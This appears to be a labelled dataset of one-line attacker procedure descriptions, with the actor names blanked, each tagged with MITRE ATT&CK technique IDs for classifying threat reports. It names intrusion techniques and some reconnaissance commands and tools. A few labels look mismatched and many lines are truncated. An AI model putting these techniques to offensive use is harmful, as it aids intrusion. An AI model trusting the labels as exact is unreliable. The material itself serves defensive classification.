gathers the Mac address, IP address, and the network adapter information from the victim’s machine.	['T1016']
gathers the MAC address of the victim’s machine.	['T1016']
gathers the name of the local host, version of GNU Compiler Collection (GCC), and the system information about the CPU, machine, and operating system.	['T1082']
gathers the OS version, CPU type, amount of RAM available from the victim’s machine.	['T1082']
gathers the OS version, logical drives information, processor information, and volume information.	['T1082']
gathers the username from the victim’s machine.	['T1033']
gathers the victim's computer name, Windows version, and system language, and then sends it to its C2 server.	['T1082']
gathers the victim's IP address and domain information, and then sends it to its C2 server.	['T1016']
gathers the victim username.	['T1033']
gathers the victim’s IP address via the ipconfig -all command.	['T1016']
gathers user names from infected hosts.	['T1033']
gathers volume drive information and system information.	['T1082']
Get-Keystrokes Exfiltration module can log keystrokes.	['T1056']
Get-ProcessTokenGroup Privesc-PowerUp module can enumerate all SIDs associated with its current token.	['T1087']
Get-ProcessTokenPrivilege Privesc-PowerUp module can enumerate privileges for a given process.	['T1057']
gets an output of running processes using the tasklist command.	['T1057']
had exploited multiple vulnerabilities for execution, including Microsoft’s Equation Editor (CVE-2017-11882), an Internet Explorer vulnerability (CVE-2018-8174), CVE-2017-8570, and CVE-2017-0199.	['T1203']
harvests credentials using Invoke-Mimikatz or Windows Credentials Editor (WCE).	['T1003']
has 2 methods for elevating integrity. It can bypass UAC through eventvwr.exe and sdclt.exe.	['T1548.002']
has a built-in keylogger.	['T1056']
has a built-in module for port scanning.	['T1046']
has a built-in utility command for netstat, can do net session through PowerView, and has an interactive shell which can be used to discover additional information.	['T1049']
has access to destructive malware that is capable of overwriting a machine's Master Boot Record (MBR).	['T1070.004']
has a command to collect the victim's IP address.	['T1016']
has a command to conduct timestomping by setting a specified file’s timestamps to match those of a system file in the System32 directory.	['T1070.006']
has a command to create a reverse shell.	['T1059']
has a command to delete a file and deletes files after they have been successfully uploaded to C2 servers.	['T1070.004']
has a command to delete files.	['T1070.004']
has a command to delete its Registry key and scheduled task.	['T1070.004']
has a command to disable routing and the Firewall on the victim’s machine.	['T1562.001']
has a command to download a file.	['T1105']
has a command to download a file from the C2 server to the victim mobile device's SD card.	['T1105']
has a command to download a file to the system from its C2 server.	['T1105']
has a command to download an .exe and use process hollowing to inject it into a new process.	['T1055.012']
has a command to download and execute an additional file.	['T1105']
has a command to download and executes additional files.	['T1105']
has a command to edit the Registry on the victim’s machine.	['T1112']
has a command to gather system information from the victim’s machine.	['T1082']
has a command to get text of the current foreground window.	['T1010']
has a command to get the victim's domain and NetBIOS name.	['T1016']
has a command to list account information on the victim’s machine.	['T1087']
has a command to list all servers in the domain, as well as one to locate domain controllers on a domain.	['T1018']
has a command to list its directory and logical drives.	['T1083']
has a command to list the victim's processes.	['T1057']
has a command to obtain a directory listing.	['T1083']
has a command to obtain a process listing.	['T1057']
has a command to retrieve information about connected users.	['T1087']
has a command to retrieve metadata for files on disk as well as a command to list the current working directory.	['T1083']
has a command to return a list of running processes.	['T1057']
has a command to set certain attributes such as creation/modification timestamps on files.	['T1070.006']
has a command to take a screenshot and send it to the C2 server.	['T1113']
has a command to upload a file to the victim machine.	['T1105']
has a command to upload information about all running processes to its C2 server.	['T1057']
has a command to upload to its C2 server victim browser bookmarks.	['T1217']
has a command to upload to its C2 server victim mobile device information, including IMEI, IMSI, SIM card serial number, phone number, Android version, and other information.	['T1082']
has a command to write random data across a file and delete it.	['T1070.004']
has added persistence via the Registry key HKCU\Software\Microsoft\CurrentVersion\Run\.	['T1547.001']
has added Registry Run keys to establish persistence.	['T1547.001']
has added the path of its second-stage malware to the startup folder to achieve persistence. One of its file stealers has also persisted by adding a Registry Run key.	['T1547.001']
has a function for decrypting data containing C2 configuration information.	['T1140']
has a keylogger.	['T1056']
has a module for loading and executing PowerShell scripts.	['T1059.001']
has a module for performing remote desktop access.	['T1021.001']
has a module to clear event logs with PowerShell.	['T1070']
has a package that collects documents from any inserted USB sticks.	['T1025']
has a plugin that can perform ARP scanning as well as port scanning.	['T1046']
has a plugin to detect active drivers of some security products.	['T1518.001']
has a plugin to drop and execute vulnerable Outpost Sandbox or avast! Virtualization drivers in order to gain kernel mode privileges.	['T1068']
has a tool called CANDYKING to capture a screenshot of user's desktop.	['T1113']
has a tool that can copy files to remote machines.	['T1105']
has a tool that can detect the existence of remote systems.	['T1018']
has a tool that can enumerate current network connections.	['T1049']
has a tool that can enumerate the permissions associated with Windows groups.	['T1069']
has a tool that can list out currently running processes.	['T1057']
has a tool that can locate credentials in files on the file system such as those from Firefox or Chrome.	['T1552.001']
has a tool that can run DLLs.	['T1218.011']
has a tool that exfiltrates data over the C2 channel.	['T1041']
has a tool that looks for files and directories on the local file system.	['T1083']
has attached a malicious document to an email to gain initial access.	['T1598.002']
has attempted to get users to enable macros and launch malicious Microsoft Word documents delivered via spearphishing emails.	['T1204']
has attempted to get users to execute malware via social media and spearphishing emails.	['T1204']
has attempted to get users to launch a malicious Microsoft Word attachment delivered via a spearphishing email.	['T1204']
has attempted to get users to launch malicious Microsoft Word attachments delivered via spearphishing emails.	['T1204']
has attempted to get users to open malicious files by sending spearphishing emails with attachments to victims.	['T1204']
has attempted to get victims to open malicious files sent via email as part of spearphishing campaigns.	['T1204']
has attempted to get victims to open malicious Microsoft Word attachment sent via spearphishing.	['T1204']
has attempted to lure users to execute a malicious dropper delivered via a spearphishing attachment.	['T1204']
has attempted to map to C$ on enumerated hosts to test the scope of their current credentials/context.	['T1021.002']
has beaconed to its C2 over port 443.	['T1043']
has been delivered through compromised sites acting as watering holes.	['T1189']
has been known to add created accounts to local admin groups to maintain elevated access.	['T1098']
has been known to brute force password hashes to be able to leverage plain text credentials.	['T1110']
has been known to create or enable accounts, such as support_388945a0.	['T1136']
has been known to pack their tools.	['T1027.002']
has been known to remove indicators of compromise from tools.	['T1027.005']
has been known to stage files for exfiltration in a single location.	['T1074']
has been known to use credential dumping.	['T1003']
has been known to use multiple backdoors per campaign.	['T1108']
has been launched by starting iexplore.exe and replacing it with 's payload.	['T1055.012']
has been loaded onto Exchange servers and disguised as an ISAPI filter (DLL file). The IIS w3wp.exe process then loads the malicious DLL.	['T1574.002']
has been loaded through DLL side-loading of a legitimate Citrix executable that is set to persist through the registry run key location: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\ssonsvr.exe	['T1547.001']
has been observed being used to download  and the Cobalt Strike Beacon payload onto victims.	['T1105']
has been observed using SQL injection to gain access to systems.	['T1190']
has been packed with the UPX packer.	['T1027.002']
has been used to decode binaries hidden inside certificate files as Base64 information.	['T1140']
has been used to execute remote commands.	['T1059']
has built in commands to identify a host’s IP address and find out other network configuration settings by viewing connected sessions.	['T1016']
has bypassed UAC.	['T1548.002']
has checked for the local admin group domain admin group and Exchange Trusted Subsystem groups using the commands net group Exchange Trusted Subsystem /domain and net group domain admins /domain.	['T1069']
has cleared logs during post compromise cleanup activities.	['T1070']
has cleared select event log entries.	['T1070']
has collected a list of files from the victim and uploaded it to its C2 server, and then created a new list of specific files to steal.	['T1083']
has collected data from victims' local systems.	['T1005']
has collected emails from victim Microsoft Exchange servers.	['T1114']
has collected files from a local victim.	['T1005']
has collected information from Microsoft SharePoint services within target networks.	['T1213']
has commands to delete files and persistence mechanisms from the victim.	['T1070.004']
has commands to enumerate all storage devices and to find all files that start with a particular string.	['T1083']
has commands to get the current directory name as well as the size of a file. It also has commands to obtain information about logical drives, drive type, and free space.	['T1083']
has commands to get the current user's name and SID.	['T1033']
has commands to get the time the machine was built, the time, and the time zone.	['T1124']
has compressed and encrypted data into password-protected RAR archives prior to exfiltration.	['T1486']
has compressed data into password-protected RAR archives prior to exfiltration.	['T1560']
has compressed files before exfiltration using TAR and RAR.	['T1560']
has compromised third parties and used compromised accounts to send spearphishing emails with targeted attachments to recipients.	['T1598.002']
has conducted port scans on a host.	['T1046']
has connected to C2 servers through proxies.	['T1090']
has copied its backdoor across open network shares, including ADMIN$, C$WINDOWS, D$WINDOWS, and E$WINDOWS.	['T1021.002']
has created a scheduled task named “AdobeFlashSync” to establish persistence.	['T1036']
has created forged Kerberos Ticket Granting Ticket (TGT) and Ticket Granting Service (TGS) tickets to maintain administrative access.	['T1550.003']
has created new services to establish persistence.	['T1543.003']
has created Windows tasks to establish persistence.	['T1053.005']
has deleted and overwrote files to cover tracks.	['T1070.004']
has deleted existing logs and exfiltrated file archives from a victim.	['T1070.004']
has deleted files associated with their payload after execution.	['T1070.004']
has deleted Registry keys during post compromise cleanup activities.	['T1112']
has deleted tmp and prefetch files during post compromise cleanup activities.	['T1070.004']
has delivered  and  by executing PowerShell commands through DDE in Word documents.	['T1559.002']
"has delivered malicious links and macro-enabled documents that required targets to click the ""enable content"" button to execute the payload on the system."	['T1204']
has delivered zero-day exploits and malware to victims via targeted emails containing a link to malicious content hosted on an uncommon Web server.	['T1598.003']
has delivered zero-day exploits and malware to victims via targeted emails containing malicious attachments.	['T1598.002']
has deployed a bootkit along with  to ensure its persistence on the victim. The bootkit shares code with some variants of .	['T1542.003']
has deployed backup web shells and obtained OWA account credentials during intrusions that it subsequently used to attempt to regain access when evicted from a victim network.	['T1108']
has deployed Meterpreter stagers and SplinterRAT instances in the victim network after moving laterally.	['T1105']
has detached network shares after exfiltrating files, likely to evade detection.	['T1070.005']
has detected security tools.	['T1518.001']
has disabled host-based firewalls. The group has also globally opened port 3389.	['T1562.001']
has distributed targeted emails containing links to malicious documents with embedded macros.	['T1598.003']
has distributed targeted emails containing Word documents with embedded malicious macros.	['T1598.002']
has downloaded additional code and files from servers onto victims.	['T1105']
has downloaded additional files, including by using a first-stage downloader to contact the C2 server to obtain the second-stage implant.	['T1105']
has downloaded additional malware, including by using .	['T1105']
has downloaded additional malware to execute on the victim's machine, including by using a PowerShell script to launch shellcode that retrieves an additional payload.	['T1105']
has downloaded additional scripts and files from adversary-controlled servers.  has also used an uploader known as LUNCHMONEY that can exfiltrate files to Dropbox.	['T1105']
has downloaded second stage malware from compromised websites.	['T1105']
has dumped credentials, including by using .	['T1003']
has dumped credentials from victims. Specifically, the group has used the tool GET5 Penetrator to look for remote login and hard-coded credentials.	['T1003']
has encoded payloads with a single-byte XOR, both skipping the key itself and zeroing in an attempt to avoid exposing the key.	['T1027']
has encoded strings in its malware with base64 as well as with a simple, single-byte XOR obfuscation using key 0x40.	['T1027']
has encrypted and encoded data in its malware, including by using base64.	['T1027']
has encrypted C2 traffic with RC4, previously using keys of 88888888 and babybear.	['T1573']
has encrypted C2 traffic with RSA.	['T1573']
has encrypted documents and malicious executables.	['T1027']
has established persistence by creating autostart extensibility point (ASEP) Registry entries in the Run key and other Registry keys, as well as by creating shortcuts in the Internet Explorer Quick Start folder.	['T1547.001']
has established persistence by setting the HKCU\Software\Microsoft\Windows\CurrentVersion\Run key value for wdm to the path of the executable. It has also used the Registry entry HKEY_USERS\Software\Microsoft\Windows\CurrentVersion\Run vpdn “%ALLUSERPROFILE%\%APPDATA%\vpdn\VPDN_LU.exe” to establish persistence.	['T1547.001']
has established persistence by using S4U tasks as well as the Scheduled Task option in PowerShell Empire.	['T1053.005']
has established persistence by using the Registry option in PowerShell Empire to add a Run key.	['T1547.001']
has exfiltrated data in HTTP POST headers.	['T1071']
has exfiltrated data over FTP separately from its primary C2 channel over DNS.	['T1048']
has exfiltrated files stolen from file shares.	['T1039']
has exfiltrated files stolen from local systems.	['T1005']
has exploited Adobe Flash vulnerability CVE-2018-4878 for execution.	['T1203']
has exploited CVE-2015-1701 and CVE-2015-2387 to escalate privileges.	['T1068']
has exploited Microsoft Word vulnerability CVE-2014-4114 for execution.	['T1203']
has exploited Microsoft Word vulnerability CVE-2017-0199 for execution.	['T1203']
has exploited the CVE-2016-0167 local vulnerability.	['T1068']
has functionality to copy itself to network shares.	['T1080']
has functionality to remove Registry Run key persistence as a cleanup procedure.	['T1112']
has gathered hashed user credentials over SMB using spearphishing attachments with external resource links and by modifying .LNK file icon resources to collect credentials from virtualized systems.	['T1187']
has gathered information about local network connections using .	['T1049']
has infected victims by tricking them into visiting compromised watering hole websites.	['T1189']
has infected victims using watering holes.	['T1189']
has injected SMB URLs into malicious Word spearphishing attachments to initiate .	['T1221']
has inserted garbage characters into code, presumably to avoid anti-virus detection.	['T1027.001']
has installed updates and new malware on victims.	['T1105']
has interacted with compromised systems to browse and copy files through its graphical user interface in  sessions.	['T1061']
has keylogging functionality.	['T1056']
has leveraged a zero-day vulnerability to escalate privileges.	['T1068']
has leveraged multiple types of spearphishing in order to attempt to get a user to open links and attachments.	['T1204']
has masqueraded as legitimate Adobe Content Management System files.	['T1036']
has masqueraded as legitimate software update packages such as Adobe Acrobat Reader and Intel.	['T1036']
has modules that are capable of capturing audio.	['T1123']
has obfuscated code using base64 and gzip compression.	['T1027']
has obfuscated DLLs and functions using dummy API calls inserted between real instructions.	['T1027.001']
has obfuscated strings in  by base64 encoding, and then encrypting them.	['T1027']
has packed malware payloads before delivery to victims.	['T1027.002']
has performed C2 using DNS via A, OPT, and TXT records.	['T1071']
has performed credential dumping with  and Lazagne.	['T1003']
has performed DLL search order hijacking to execute their payload.	['T1574.001']
has performed screen captures of victims, including by using a tool, scr.exe (which matched the hash of ScreenUtil).	['T1113']
has performed timestomping on victim files.	['T1070.006']
has received C2 instructions from user profiles created on legitimate websites such as Github and TechNet.	['T1102']
has registered a Windows shell script under the Registry key HKCU\Environment\UserInitMprLogonScript to establish persistence.	['T1037']
has registered itself as a scheduled task to run each time the current user logs in.	['T1053.005']
has registered itself as a service to establish persistence.	['T1543.003']
has registered its persistence module on domain controllers as a Windows LSA (Local System Authority) password filter to dump credentials any time a domain, local user, or administrator logs in or changes a password.	['T1003']
has retrieved internal documents from machines inside victim environments, including by using  to stage documents before.	['T1005']
has run a keylogger plug-in on a victim.	['T1056']
has run a plug-in on a victim to spread through the local network by using  and accessing admin shares.	['T1021.002']
has run hostname and systeminfo on a victim.	['T1082']
has run net user, net user /domain, net group “domain admins” /domain, and net group “Exchange Trusted Subsystem” /domain to get account listings on a victim.	['T1087']
has run whoami on a victim.	['T1033']
has sent a C2 response that was base64-encoded.	['T1132']
has sent malicious Office documents via email as part of spearphishing campaigns as well as executables disguised as documents.	['T1598.002']
has sent malicious Word OLE compound documents to victims.	['T1559.002']
has sent malware that required users to hit the enable button in Microsoft Excel to allow an .iqy file to be downloaded.	['T1204']
has sent spearphishing attachments attempting to get a user to open them.	['T1204']
has sent spearphishing emails with malicious attachments, including .rtf, .doc, and .xls files.	['T1598.002']
has sent spearphishing emails with various attachment types to corporate and personal email accounts of victim organizations. Attachment types have included .rtf, .doc, .xls, archives containing LNK files, and password protected archives containing .exe and .scr executables.	['T1598.002']
has sent Word OLE compound documents with malicious obfuscated VBA macros that will run upon user execution. The group has also used an exploit toolkit known as Threadkit that launches .bat files.	['T1064']
has several modules that search the Windows Registry for stored credentials: Get-UnattendedInstallFile, Get-Webconfig, Get-ApplicationHost, Get-SiteListPassword, Get-CachedGPPPassword, and Get-RegistryAutoLogon.	['T1552.002']
has sometimes used drive-by attacks against vulnerable browser plugins.	['T1189']
has staged encrypted archives for exfiltration on Internet-facing servers that had previously been compromised with .	['T1074']
has targeted victims using spearphishing emails with malicious Microsoft Word attachments.	['T1598.002']
has targeted victims with spearphishing emails containing malicious Microsoft Word documents.	['T1598.002']
has tested malware samples to determine AV detection and subsequently modified the samples to ensure AV evasion.	['T1027.005']
has the ability to create a reverse shell.	['T1059']
has the ability to discover and manipulate Windows services.	['T1007']
has the ability to download and execute additional files.	['T1105']
has the ability to download files.	['T1105']
has the ability to enumerate drive types.	['T1083']
has the ability to enumerate processes.	['T1057']
has the ability to enumerate system information.	['T1082']
has the ability to execute shell commands.	['T1059']
has the ability to identify any anti-virus installed on the infected system.	['T1518.001']
has the ability to initiate keylogging and screen captures.	['T1113']
has the ability to list processes on the system.	['T1057']
has the ability to modify the Registry.	['T1112']
has the ability to obtain screenshots of the compromised system.	['T1113']
has the ability to remove Registry entries that it created during execution.	['T1070']
has the ability to scan for security tools such as firewalls and antivirus tools.	['T1518.001']
has the ability to search for a given filename on a victim.	['T1083']
has the ability to upload and download files from its C2 server.	['T1105']
has the capability to access the webcam on the victim’s machine.	['T1125']
has the capability to add its own account to the victim's machine.	['T1136']
has the capability to capture audio from a victim machine.	['T1123']
has the capability to capture keystrokes.	['T1056']
has the capability to capture screenshots.	['T1113']
has the capability to capture video from a victim machine.	['T1125']
has the capability to communicate over a backup channel via plus.google.com.	['T1008']
has the capability to create a remote shell.	['T1059']
has the capability to create a remote shell and execute specified commands.	['T1059']
has the capability to create a reverse shell.	['T1059']
has the capability to create a reverse shell on victims.	['T1059']
has the capability to delete files off the victim’s machine.	['T1070.004']
has the capability to delete local files.	['T1070.004']
has the capability to discover processes.	['T1057']
has the capability to download a file to the victim from the C2 server.	['T1105']
has the capability to download files.	['T1105']
has the capability to download files from the C2 server.	['T1105']
has the capability to enumerate files.	['T1083']
has the capability to execute the command ipconfig /all.	['T1016']
has the capability to execute the command net start to interact with services.	['T1007']
has the capability to execute ver, systeminfo, and gpresult commands.	['T1082']
has the capability to gather the IP address from the victim's machine.	['T1016']
has the capability to gather the system’s hostname and OS version.	['T1082']
has the capability to gather the username from the victim's machine.	['T1033']
has the capability to gather the victim's current directory.	['T1083']
has the capability to gather the victim's proxy information.	['T1016']
has the capability to identify remote hosts on connected networks.	['T1018']
has the capability to log keystrokes from the victim’s machine.	['T1056']
has the capability to obtain a listing of running processes (including loaded modules).	['T1057']
has the capability to obtain file and directory listings.	['T1083']
has the capability to open a remote shell and run basic commands.	['T1059']
has the capability to retrieve information about groups.	['T1069']
has the capability to retrieve information about shares on remote hosts.	['T1135']
has the capability to retrieve information about the OS.	['T1082']
has the capability to retrieve information about users on remote hosts.	['T1087']
has the capability to scan for open ports on hosts in a connected network.	['T1046']
has the capability to schedule remote AT jobs.	['T1053.005']
has the capability to take screenshots of the victim’s machine.	['T1113']
has the capability to use rm -rf to remove folders and files from the victim's machine.	['T1070.004']
has transferred files using the Intel® Active Management Technology (AMT) Serial-over-LAN (SOL) channel.	['T1105']
has tunneled RDP backdoors over port 443.	['T1043']
has updated and modified its malware, resulting in different hash values that evade detection.	['T1027.005']
has used , a RAT that uses HTTP to communicate.	['T1071']
has used a Batch file to automate frequently executed post compromise cleanup activities.	['T1064']
has used a batch script that adds a Registry Run key to establish malware persistence.	['T1547.001']
has used a DLL known as SeDll to decrypt and execute other JavaScript backdoors.	['T1140']
has used a global service provider's IP as a proxy for C2 traffic from a victim.	['T1090']
has used a keylogging tool called KEYPUNCH.	['T1056']
has used a keylogging tool that records keystrokes in encrypted files.	['T1056']
has used a Metasploit PowerShell module to download and execute shellcode and to set up a local listener.	['T1059.001']
has used a Metasploit PowerShell module to download and execute shellcode and to set up a local listener.  has also used scripting to iterate through a list of compromised PoS systems, copy data to a log file, and remove the original data files.	['T1064']
has used an audio capturing utility known as SOUNDWAVE that captures microphone input.	['T1123']
has used Android backdoors capable of enumerating specific files on the infected devices.	['T1083']
has used Android backdoors capable of exfiltrating specific files directly from the infected devices.	['T1005']
has used  and  to register a scheduled task to execute malware during lateral movement.	['T1053.005']
has used an RSS feed on Livejournal to update a list of encrypted C2 server names.	['T1102']
has used AOL Instant Messenger for C2.	['T1102']
has used appcmd.exe to disable logging on a victim server.	['T1562.001']
has used application shim databases for persistence.	['T1546.011']
has used a Registry Run key to establish persistence by executing JavaScript code within the rundll32.exe process.	['T1547.001']
has used a scheduled task for persistence.	['T1053.005']
has used a script (atexec.py) to execute a command on a target machine via Task Scheduler.	['T1053.005']
has used a tool known as RemoteExec (similar to ) to remotely execute batch scripts and binaries.	['T1569.002']
has used a tool that can obtain info about local and global group users, power users, and administrators.	['T1087']
has used a tool to capture screenshots.	['T1113']
"has used a tool to dump credentials by injecting itself into lsass.exe and triggering with the argument ""dig."" The group has also used a tools to dump passwords from browsers."	['T1003']
has used automated collection.	['T1119']
has used a variant of NanoCore RAT that communicates with its C2 server over port 6666.	['T1571']
has used batch scripting to automate execution of commands.	['T1064']
has used batch scripts and scheduled tasks to delete critical system files.	['T1070.004']
has used batch scripts in its malware to install persistence mechanisms.	['T1064']
has used bitsadmin.exe to download additional tools.	['T1197']
has used brute force techniques to obtain credentials.	['T1110']
has used C:\Windows\Debug and C:\Perflogs as staging directories.	['T1074']
has used cmd.exe to execute commmands.	['T1059']
has used CMSTP.exe and a malicious INF to execute its  payload.	['T1218.003']
has used code-signing certificates on its malware that are either forged due to weak keys or stolen.	['T1553.002']
has used COM hijacking for persistence by replacing the legitimate MMDeviceEnumerator object with a payload.	['T1546.015']
has used COM hijacking to establish persistence by hijacking a class named MMDeviceEnumerator and also by registering the payload as a Shell Icon Overlay handler COM object ({3543619C-D563-43f7-95EA-4DA7E1CC396A}).	['T1546.015']
has used compromised credentials to access other systems on a victim network.	['T1078']
has used compromised WordPress blogs as C2 servers.	['T1102']
has used credential dumping tools.	['T1003']
has used credential dumping tools such as  and Lazagne to steal credentials to accounts logged into the compromised system and to Outlook Web Access.	['T1003']
has used custom DNS Tunneling protocols for C2.	['T1095']
has used CVE-2014-6324 to escalate privileges.	['T1068']
has used CVE-2015-4902 to bypass security features.	['T1211']
has used Daniel Bohannon’s Invoke-Obfuscation framework. The group also used files with base64 encoded PowerShell commands.	['T1027']
has used DLL search order hijacking.	['T1574.001']
has used DLL side-loading.	['T1574.002']
has used DLL side-loading to load malicious payloads.	['T1574.002']
has used encoded PowerShell scripts uploaded to  installations to download and install , as well as to evade defenses.	['T1064']
has used encoded PowerShell scripts uploaded to  installations to download and install .  also used PowerShell scripts to evade defenses.	['T1059.001']
has used exploits to increase their levels of rights and privileges.	['T1068']
has used filenames and Registry key names associated with Windows Defender.	['T1036']
has used Flash Player (CVE-2016-4117, CVE-2018-4878) and Word (CVE-2017-0199) exploits for execution.	['T1203']
has used  for credential dumping, as well as Metasploit’s  NTDSGRAB module to obtain a copy of the victim's Active Directory database.	['T1003']
has used fragmented strings, environment variables, standard input (stdin), and native character-replacement functionalities to obfuscate commands.	['T1027']
has used HTTP, HTTPS, and DNS for command and control.	['T1071']
has used HTTP for C2, including sending error codes in Cookie headers.	['T1071']
has used HTTP for C2.	['T1071']
has used HTTP requests for command and control.	['T1071']
has used  in a macro to decode base64-encoded content contained in a dropper document attached to an email. The group has used certutil -decode to decode files on the victim’s machine when dropping .	['T1140']
has used JavaScript that communicates over HTTP or HTTPS to attacker controlled domains to download additional frameworks.	['T1071']
has used keyloggers that are also capable of dumping credentials.	['T1003']
has used keylogging tools.	['T1056']
has used legitimate access granted to Managed Service Providers in order to access victims of interest.	['T1199']
has used legitimate VPN, RDP, Citrix, or VNC credentials to maintain access to a victim environment.	['T1078', 'T1133']
has used macros in s as well as executed VBScripts on victim machines.	['T1064']
has used macros in Word documents that would download a second stage if executed.	['T1064']
has used malicious macros embedded inside Office documents to execute files.	['T1064']
has used Metasploit to perform reflective DLL injection in order to escalate privileges.	['T1055']
has used Meterpreter to enumerate users on remote systems.	['T1033']
has used Mshta.exe to execute its  payload.	['T1218.005']
has used mshta.exe to execute VBScript to execute malicious code on victim systems.	['T1218.005']
has used multiple software exploits for common client software, like Microsoft Word and Adobe Reader, to gain code execution as part of.	['T1203']
has used multiple types of scripting for execution, including JavaScript, JavaScript Scriptlets in XML, and VBScript.	['T1064']
has used net.exe in a script with net accounts /domain to find the password policy of a domain.	['T1201']
has used net group /domain, net localgroup administrators, net group “domain admins” /domain, and net group “Exchange Trusted Subsystem” /domain to find group permission settings on a victim.	['T1069']
has used netstat -an on a victim to get a listing of network connections.	['T1049']
has used net time to check the local time on a target system.	['T1124']
has used net use to conduct internal discovery of systems. The group has also used quser.exe to identify existing RDP sessions on a victim.	['T1049']
has used network scanning and enumeration tools, including .	['T1018']
has used ping to identify other machines of interest.	['T1018']
has used port 8080 for C2.	['T1043']
has used port 80 for C2.	['T1043']
has used ports 53, 80, 443, and 8080 for C2.	['T1043']
has used ports 8060 and 8888 for C2.	['T1571']
has used powershell.exe to download and execute scripts.	['T1059.001']
has used PowerShell-based tools and shellcode loaders for execution.	['T1059.001']
has used PowerShell for execution.	['T1059.001']
has used PowerShell for execution and privilege escalation.	['T1059.001']
has used PowerShell for execution of a payload.	['T1059.001']
has used PowerShell on victim systems to download and run payloads after exploitation.	['T1064', 'T1059.001']
has used PowerShell scripts for execution, including use of a macro to run a PowerShell command to decode file contents.	['T1059.001']
has used PowerShell scripts to download and execute programs in memory, without writing to disk.	['T1064', 'T1059.001']
has used process hollowing in iexplore.exe to load the  implant.	['T1055.012']
has used Putty Secure Copy Client (PSCP) to transfer data.	['T1021']
has used Putty to access compromised systems.	['T1021']
has used RAR to compress collected data before.	['T1560']
has used RAR to stage and compress local folders.	['T1560']
has used RC4 encryption (for Datper malware) and AES (for xxmm malware) to obfuscate HTTP traffic.	['T1573']
has used RC4 to encrypt C2 traffic.	['T1573']
has used RDP connections to move across the victim network.	['T1021.001']
has used RDP for.	['T1021.001']
has used RDP to move laterally to systems in the victim environment.	['T1021.001']
has used Registry Run keys for persistence. The group has also set a Startup path to launch the PowerShell shell command and download Cobalt Strike.	['T1547.001']
has used reg query “HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default” on a victim to query the Registry.	['T1012']
has used regsvr32.exe to execute a server variant of  in victim networks.	['T1218.010']
has used regsvr32 for execution.	['T1218.010']
has used Remote Desktop Protocol for lateral movement. The group has also used tunneling tools to tunnel RDP into the environment.	['T1021.001']
has used Remote Desktop Protocol to conduct lateral movement.	['T1021.001']
has used scheduled tasks to persist on victim systems.	['T1053.005']
has used sc query on a victim to gather information about services.	['T1007']
has used several different keyloggers.	['T1056']
has used several tools to scan for open NetBIOS nameservers and enumerate NetBIOS sessions.	['T1016']
has used shell and VBS scripts as well as embedded macros for execution.	['T1064']
has used shellcode to download Meterpreter after compromising a victim.	['T1105']
has used spearphishing via a link to get users to download and run their malware.	['T1204']
has used spearphishing with an attachment to deliver files with exploits to initial victims.	['T1598.002']
has used stolen certificates to sign its malware.	['T1553.002']
has used stolen credentials to connect remotely to victim networks using VPNs protected with only a single factor. The group has also moved laterally using the Local Administrator account.	['T1078']
has used strategic web compromises, particularly of South Korean websites, to distribute malware. The group has also used torrent file-sharing sites to more indiscriminately disseminate malware to victims. As part of their compromises, the group has used a Javascript based profiler called RICECURRY to profile a victim's web browser and deliver malicious code accordingly.	['T1189']
has used TeamViewer to preserve remote access in case control using the Cobalt Strike module was lost.	['T1108']
has used Technet and Pastebin web pages for command and control.	['T1102']
has used the command-line interface.	['T1059']
has used the command-line interface for execution.	['T1059']
has used the meek domain fronting plugin for Tor to hide the destination of C2 traffic.	['T1090.004']
has used the Microsoft administration tool csvde.exe to export Active Directory data.	['T1087']
has used the Office Test persistence mechanism within Microsoft Office by adding the Registry key HKCU\Software\Microsoft\Office test\Special\Perf to execute code.	['T1137']
has used the open source tool Essential NetTools to map the network and build a list of targets.	['T1018']
has used the Plink utility to create SSH tunnels.	['T1573']
has used the Plink utility to tunnel RDP back to C2 infrastructure.	['T1573']
has used the  RAT, which communicates over HTTP with a payload encrypted with RC4.	['T1573']
has used the sticky-keys technique to bypass the RDP login screen on remote systems during intrusions.	['T1546.008']
has used the Windows command shell to execute commands.	['T1059']
has used  to locate PDF, Excel, and Word documents during. The group also searched a compromised DCCC computer for specific terms.	['T1083']
has used tools to compress data before exfilling it.	['T1560']
has used tools to take screenshots from victims.	['T1113']
has used tools with the functionality to search for specific information about the attached hard drive that could be used to identify and overwrite the firmware.	['T1120']
has used valid, compromised email accounts for defense evasion, including to send malicious emails to other victim organizations.	['T1078']
has used valid accounts shared between Managed Service Providers and clients to move between the two environments.	['T1078']
has used valid digital certificates from Sysprint AG to sign its  dropper.	['T1553.002']
has used various batch scripts to establish C2, download additional files, and conduct other functions.	['T1064']
has used various forms of spearphishing attempting to get a user to open links or attachments.	['T1204']
has used various forms of spearphishing in attempts to get users to open links or attachments.	['T1204']
has used various methods of process injection including hot patching.	['T1055']
has used various tools to download files, including DGet (a similar tool to wget).	['T1105']
has used various tools to perform credential dumping.	['T1003']
has used various types of scripting for execution, including .bat and .vbs scripts. The group has also used macros to deliver malware such as  and .	['T1064']
has used VBS, VBE, and batch scripts for execution.	['T1064']
has used VBScript and JavaScript files to execute its  payload.	['T1064']
has used  via Web shell to establish redundant access. The group has also used harvested credentials to gain access to Internet-accessible resources such as Outlook Web Access, which could be used for redundant access.	['T1108']
has used Web shells, often to maintain access to a victim network.	['T1505.003']
has used Web shells to maintain access to victim websites.	['T1505.003']
has used Windows DDE for execution of commands and a malicious VBS.	['T1559.002']
has used WinSCP to exfiltrate data from a targeted organization over FTP.	['T1048']
has used WMI event filters to establish persistence.	['T1546.003']
has used WMI for persistence.	['T1546.003']
has used XOR with 0x90 to obfuscate its configuration file.	['T1027']
has utilized  during and.	['T1078']
hides base64-encoded and encrypted C2 server locations in comments on legitimate websites.	['T1102']
hides collected data in password-protected .rar archives.	['T1560', 'T1486']
hides from defenders by hooking libc function calls, hiding artifacts that would reveal its presence, such as the user account it creates to provide access and undermining strace, a tool often used to identify malware.	['T1014']
hides many of its backdoor payloads in an alternate data stream (ADS).	['T1564.004']
hollows out a newly created process RegASM.exe and injects its payload into the hollowed process.	['T1055.012']
identified and browsed file servers in the victim network, sometimes , viewing files pertaining to ICS or Supervisory Control and Data Acquisition (SCADA) systems.	['T1135']
identifies and kills anti-malware processes.	['T1562.001']
identifies a proxy server if it exists and uses it to make HTTP requests.	['T1090']
identifies files and directories for collection by searching for specific file extensions or file modification time.	['T1083']
identifies files matching certain file extension and copies them to subdirectories it created.	['T1083']
identifies files with certain extensions and copies them to a directory in the user's profile.	['T1074']
identifies processes and collects the process ids.	['T1057']
identifies security software such as antivirus through the Security module.	['T1518.001']
